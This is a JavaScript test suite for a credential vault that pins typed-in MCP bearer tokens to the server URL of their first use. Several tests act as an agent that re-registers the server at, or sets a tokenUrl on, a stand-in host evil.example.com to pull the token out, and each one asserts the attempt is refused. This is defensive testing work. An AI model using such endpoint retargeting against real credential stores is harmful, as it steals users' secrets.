import assert from 'node:assert/strict';
import { test } from 'node:test';
import { setup } from './setup.mjs';

const { embedder, served } = await setup();

const TOKEN = 'fake-notes-mcp-0501';
const OWNER = { pid: 9, ppid: 1, uid: 1000, gid: 1000, tag: 'cone', users: 'enforce' };

async function ready(t) {
  const page = await embedder(t);
  await page.evaluate(() => window.harness.connect());
  const token = await page.evaluate(
    (value) =>
      window.harness.call('put', { name: 'NOTES_MCP', value, kind: 'mcp', server: 'notes' }),
    TOKEN
  );
  await page.evaluate(() => window.harness.agent());
  const ask = (op, fields) => page.evaluate((o, f) => window.harness.ask(o, f), op, fields);
  return { page, ask, token };
}

const call = (url, placeholder) => ({
  method: 'POST',
  url,
  headers: [['authorization', `Bearer ${placeholder}`]],
  body: '{}',
});

const pins = async (page) =>
  (await page.evaluate(() => window.harness.call('audit'))).audit
    .filter((entry) => entry.type === 'endpoints')
    .map(({ name, pinned, unpinned, adopted }) => ({
      ...(name ? { name } : {}),
      pinned,
      unpinned,
      adopted,
    }));

test('a typed-in MCP token pins to the agent server URL of its first fill, and an agent retarget after the pin, or after a rotation, is refused', async (t) => {
  const { page, ask, token } = await ready(t);
  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://notes.example.com/mcp' }] });
  const first = await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp/tools', token.placeholder),
  });
  assert.deepEqual(first.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
  const view = (await page.evaluate(() => window.harness.call('list'))).list.secrets.find(
    (r) => r.name === 'NOTES_MCP'
  );
  assert.deepEqual(
    [view.server, view.url, view.pinned],
    ['notes', 'https://notes.example.com/mcp', true]
  );
  assert.deepEqual(await pins(page), [
    {
      pinned: { name: 'NOTES_MCP', server: 'notes', host: 'notes.example.com' },
      unpinned: undefined,
      adopted: undefined,
    },
  ]);
  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://evil.example.com/mcp' }] });
  const moved = await ask('mcp', {
    server: 'notes',
    request: call('https://evil.example.com/mcp', token.placeholder),
  });
  assert.match(moved.error.message, /NOTES_MCP isn't a credential of notes/);
  assert.ok(!JSON.stringify(moved).includes(TOKEN));
  const again = await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(again.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
  await page.evaluate(() =>
    window.harness.call('put', {
      name: 'NOTES_MCP',
      value: 'fake-notes-rotated-0502',
      kind: 'mcp',
      server: 'notes',
    })
  );
  const rotated = await ask('mcp', {
    server: 'notes',
    request: call('https://evil.example.com/mcp', token.placeholder),
  });
  assert.match(rotated.error.message, /NOTES_MCP isn't a credential of notes/);
  const kept = await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(kept.request.headers, [['authorization', 'Bearer fake-notes-rotated-0502']]);
});

test('NEGATIVE a typed-in MCP token never pins to a wildcard agent server', async (t) => {
  const { ask, token } = await ready(t);
  const registered = await ask('endpoints', {
    mcp: [{ server: 'notes', url: 'https://*.example.com/mcp' }],
  });
  assert.equal(registered.ok, true);
  const sent = await ask('mcp', {
    server: 'notes',
    request: call('https://good.example.com/mcp', token.placeholder),
  });
  assert.match(
    sent.error.message,
    /NOTES_MCP (isn't a credential of notes|is sent only to notes's own endpoints)/
  );
  assert.ok(!JSON.stringify(sent).includes(TOKEN));
});

test('a page registration replaces a pin; once the page drops its server, an unpinned token never pins to an agent URL again', async (t) => {
  const { page, ask, token } = await ready(t);
  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://notes.example.com/mcp' }] });
  await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [{ server: 'notes', url: 'https://notes2.example.com/mcp' }],
    })
  );
  const old = await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  assert.match(old.error.message, /is sent only to notes's own endpoints/);
  const now = await ask('mcp', {
    server: 'notes',
    request: call('https://notes2.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(now.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
  await page.evaluate(() =>
    window.harness.call('endpoints', {
      remove: { mcp: [{ server: 'notes', url: 'https://notes2.example.com/mcp' }] },
    })
  );
  const pinned = await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(pinned.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
  const unpinned = await page.evaluate(() =>
    window.harness.call('endpoints', { unpin: ['NOTES_MCP'] })
  );
  assert.equal(unpinned.ok, true);
  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://notes3.example.com/mcp' }] });
  const after = await ask('mcp', {
    server: 'notes',
    request: call('https://notes3.example.com/mcp', token.placeholder),
  });
  assert.match(after.error.message, /NOTES_MCP isn't a credential of notes/);
  assert.ok(!JSON.stringify(after).includes(TOKEN));
  await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [{ server: 'notes', url: 'https://notes3.example.com/mcp' }],
    })
  );
  const trusted = await ask('mcp', {
    server: 'notes',
    request: call('https://notes3.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(trusted.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
  assert.deepEqual(
    (await pins(page)).map((entry) => entry.pinned?.host ?? `-${entry.unpinned?.host}`).reverse(),
    ['notes.example.com', '-notes.example.com']
  );
  const bad = await page.evaluate(() => window.harness.call('endpoints', { unpin: 'NOTES_MCP' }));
  assert.equal(bad.error.code, 'EINVAL');
});

test('unpin lets a token pin again when the page never registered its server', async (t) => {
  const { page, ask, token } = await ready(t);
  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://notes.example.com/mcp' }] });
  await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  await page.evaluate(() => window.harness.call('endpoints', { unpin: ['NOTES_MCP'] }));
  await ask('endpoints', { mcp: [{ server: 'notes', url: 'https://notes3.example.com/mcp' }] });
  const repinned = await ask('mcp', {
    server: 'notes',
    request: call('https://notes3.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(repinned.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
});

test('a kernel forward pins a typed-in token at its first 2xx, never at a failure', async (t) => {
  const { page, ask, token } = await ready(t);
  await ask('endpoints', {
    mcp: [{ server: 'notes', url: 'https://notes.example.com/mcp', names: ['NOTES_MCP'] }],
  });
  const send = (status) =>
    page.evaluate(
      (f, s) =>
        window.harness.forward(f, {
          head: { status: s, statusText: '', url: f.head.url, headers: [] },
          chunks: ['{}'],
        }),
      {
        head: {
          method: 'POST',
          url: 'https://notes.example.com/mcp/call',
          headers: [['Authorization', `Bearer ${token.placeholder}`]],
        },
        body: '{}',
        owner: OWNER,
        exit: 'page',
        rawTraits: {},
      },
      status
    );
  const failed = await send(500);
  assert.deepEqual(failed.reply.head.headers, [['Authorization', `Bearer ${TOKEN}`]]);
  assert.deepEqual(await pins(page), []);
  await send(200);
  let found = [];
  for (let i = 0; i < 40 && !found.length; i++) {
    found = await pins(page);
    if (!found.length) await new Promise((resolve) => setTimeout(resolve, 50));
  }
  assert.deepEqual(
    found.map((entry) => entry.pinned),
    [{ name: 'NOTES_MCP', server: 'notes', host: 'notes.example.com' }]
  );
});

test('NEGATIVE the upgrade adopts the one agent server of a typed-in token, never an ambiguous one, so a later agent retarget is refused', async (t) => {
  const { page, token } = await ready(t);
  const dup = await page.evaluate(() =>
    window.harness.call('put', {
      name: 'DUP_MCP',
      value: 'fake-dup-mcp-0503',
      kind: 'mcp',
      server: 'dup',
    })
  );
  const ns = served.origin('seven');
  await page.goto(`${served.vault}/config.json`);
  await page.evaluate(
    (key) =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open('slicc-vault', 1);
        open.onupgradeneeded = () => reject(new Error('the vault database is missing'));
        open.onsuccess = () => {
          const tx = open.result.transaction(['meta'], 'readwrite');
          tx.objectStore('meta').put(
            {
              model: [],
              mcp: [
                { server: 'notes', url: 'https://notes.example.com/mcp', names: [] },
                { server: 'dup', url: 'https://dup-a.example.com/mcp', names: [] },
                { server: 'dup', url: 'https://dup-b.example.com/mcp', names: [] },
              ],
            },
            key
          );
          tx.oncomplete = () => resolve(true);
          tx.onerror = () => reject(tx.error);
        };
      }),
    `endpoints:${ns}`
  );
  await embedder(t, 'seven', page);
  await page.evaluate(() => window.harness.connect());
  assert.deepEqual(await pins(page), [
    {
      pinned: undefined,
      unpinned: undefined,
      adopted: [{ server: 'notes', host: 'notes.example.com' }],
    },
  ]);
  await page.evaluate(() => window.harness.agent());
  const askAgain = (op, fields) => page.evaluate((o, f) => window.harness.ask(o, f), op, fields);
  await askAgain('endpoints', { mcp: [{ server: 'notes', url: 'https://evil.example.com/mcp' }] });
  const moved = await askAgain('mcp', {
    server: 'notes',
    request: call('https://evil.example.com/mcp', token.placeholder),
  });
  assert.match(moved.error.message, /is sent only to notes's own endpoints/);
  const ambiguous = await askAgain('mcp', {
    server: 'dup',
    request: call('https://dup-a.example.com/mcp', dup.placeholder),
  });
  assert.match(ambiguous.error.message, /DUP_MCP isn't a credential of dup/);
  const own = await askAgain('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(own.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
  const kernel = await page.evaluate((f) => window.harness.forward(f), {
    head: {
      method: 'POST',
      url: 'https://notes.example.com/mcp/call',
      headers: [['Authorization', `Bearer ${token.placeholder}`]],
    },
    body: '{}',
    owner: OWNER,
    exit: 'page',
    rawTraits: {},
  });
  assert.deepEqual(kernel.reply.head.headers, [['Authorization', `Bearer ${TOKEN}`]]);
});

test("NEGATIVE an agent's tokenUrl never receives a typed-in token", async (t) => {
  const { page, ask, token } = await ready(t);
  await ask('endpoints', {
    mcp: [
      {
        server: 'notes',
        url: 'https://notes.example.com/mcp',
        tokenUrl: 'https://evil.example.com/token',
      },
    ],
  });
  const stolen = await ask('mcp', {
    server: 'notes',
    request: call('https://evil.example.com/token', token.placeholder),
  });
  assert.equal(stolen.error.code, 'EACCES');
  assert.ok(!JSON.stringify(stolen).includes(TOKEN));
  assert.deepEqual(await pins(page), []);
  const own = await ask('mcp', {
    server: 'notes',
    request: call('https://notes.example.com/mcp', token.placeholder),
  });
  assert.deepEqual(own.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
});
